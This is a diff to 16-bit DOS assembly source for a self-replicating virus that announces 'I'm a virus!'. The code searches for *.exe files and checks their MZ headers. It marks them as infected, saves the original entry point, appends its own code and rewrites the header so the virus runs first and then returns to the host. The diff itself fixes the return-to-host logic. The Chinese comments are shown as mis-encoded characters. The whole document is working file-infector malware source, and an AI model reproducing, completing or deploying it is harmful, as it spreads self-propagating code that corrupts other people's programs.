@@ -11,9 +11,20 @@ start:
     mov ah,4ch
     int 21h
 source:
-    push cs
-    mov oldip,0
-    push oldip
+    mov ax,4200h ;åˆ°æ–‡ä»¶å¤´
+    xor cx,cx
+    xor dx,dx
+    int 21h
+
+    mov ah,3fh ;è¯»æ–‡ä»¶å¤´
+    mov cx,30h
+    lea dx,[bp+offset head]
+    mov si,dx
+    int 21h
+
+    push cs ;è·³è½¬å›åŸç¨‹åºä»£ç 
+    mov ax,word ptr [si+02eh]
+    push ax
     retf
 
 virus proc
@@ -21,62 +32,72 @@ virus proc
 locate:
     pop bp
     sub bp,offset locate
-    lea dx,[bp+offset string] ;Êä³ö×Ö·û´®
+    lea dx,[bp+offset string] ;è¾“å‡ºå­—ç¬¦ä¸²
     mov ah,09h
     int 21h
 
-    lea dx,[bp+offset dta] ;ÖÃdta
+    lea dx,[bp+offset dta] ;ç½®dta
     mov ah,1ah
     int 21h
 
-    lea dx,[bp+offset filename] ;²éÕÒµÚÒ»¸öÎÄ¼ş
+    lea dx,[bp+offset filename] ;æŸ¥æ‰¾ç¬¬ä¸€ä¸ªæ–‡ä»¶
     mov cx,0
     mov ah,4eh
     int 21h
     jc error
 
 modify:
-    lea dx,[bp+offset dta] ;ÎÄ¼şÃûµØÖ·
+    lea dx,[bp+offset dta] ;æ–‡ä»¶ååœ°å€
     add dx,1eh
     
-    mov ax,3d02h ;´ò¿ªÎÄ¼ş
+    mov ax,3d02h ;æ‰“å¼€æ–‡ä»¶
     int 21h
 
     mov bx,ax
     
-    mov ax,4200h ;µ½ÎÄ¼şÍ·
+    mov ax,4200h ;åˆ°æ–‡ä»¶å¤´
     xor cx,cx
     xor dx,dx
     int 21h
 
-    mov ah,3fh ;¶ÁÎÄ¼şÍ·
+    mov ah,3fh ;è¯»æ–‡ä»¶å¤´
     mov cx,30h
     lea dx,[bp+offset head]
     mov si,dx
     int 21h
 
-    cmp word ptr [si],5a4dh ;¼ì²éÊÇ·ñÊÇexe
+    cmp word ptr [si],5a4dh ;æ£€æŸ¥æ˜¯å¦æ˜¯exe
     jnz nextfile
 
-    cmp word ptr [si+2ah],8888h ;¼ì²éÊÇ·ñÒÑ±»¸ĞÈ¾
+    cmp word ptr [si+2ah],8888h ;æ£€æŸ¥æ˜¯å¦å·²è¢«æ„ŸæŸ“
     je nextfile
     mov word ptr [si+2ah],8888h
 
-    mov ax,word ptr [si+014h] ;±£´æÔ­³ÌĞòÈë¿Ú
-    mov oldip,ax
+    mov ax,word ptr [si+014h] ;ä¿å­˜åŸç¨‹åºå…¥å£
+    mov word ptr [si+02eh],ax
 
-    xor cx,cx ;µ½ÎÄ¼şÎ²
+    xor cx,cx ;åˆ°æ–‡ä»¶å°¾
     xor dx,dx
     mov ax,4202h
     int 21h
+
+    push ax
+    sub ax,200h
+    mov cx,ax
+    mov ax,[si+16h]
+    mov dx,10h
+    mul dx
+    sub cx,ax
+    mov word ptr [si+14h],cx ;è¿™é‡Œæˆ‘æ˜¯è¯•å‡ºæ¥ç—…æ¯’ä»£ç çš„å†…å­˜åœ°å€çš„
+    pop ax
                    
-    lea dx,[bp+offset start] ;Ğ´Èë´úÂë
+    lea dx,[bp+offset start] ;å†™å…¥ä»£ç 
     lea cx,[bp+offset theend]
     sub cx,dx
     mov ah,40h
     int 21h
 
-    mov ax,4202h ;¼ÆËãĞÂÎÄ¼ş³¤¶È
+    mov ax,4202h ;è®¡ç®—æ–°æ–‡ä»¶é•¿åº¦
     xor cx,cx
     xor dx,dx
     int 21h    
@@ -86,10 +107,7 @@ modify:
     mov word ptr [si+2],dx
     mov word ptr [si+4],ax
     
-    mov word ptr [si+14h],0012h ;ÕâÀïÎÒÊÇÊÔ³öÀ´²¡¶¾´úÂëµÄÄÚ´æµØÖ·µÄ
-                                ;99%»»¸öµØ·½¾Í²»¶ÔÁË
-
-    mov ax,4200h ;µ½ÎÄ¼şÍ·²¢¸ÄĞ´
+    mov ax,4200h ;åˆ°æ–‡ä»¶å¤´å¹¶æ”¹å†™
     xor cx,cx
     xor dx,dx
     int 21h
@@ -99,10 +117,10 @@ modify:
     int 21h
 
 nextfile:
-    mov ah,3eh ;¹Ø±ÕÎÄ¼ş
+    mov ah,3eh ;å…³é—­æ–‡ä»¶
     int 21h
 
-    mov ah,4fh ;²éÕÒÏÂÒ»¸öÎÄ¼ş
+    mov ah,4fh ;æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ–‡ä»¶
     int 21h
     jc error
     jmp modify
@@ -111,7 +129,6 @@ error:
     ret
 virus endp
 
-oldip dw 0
 filename db "*.exe",0
 dta db 02bh dup(0)
 string db "I'm a virus!",13,10,'$'
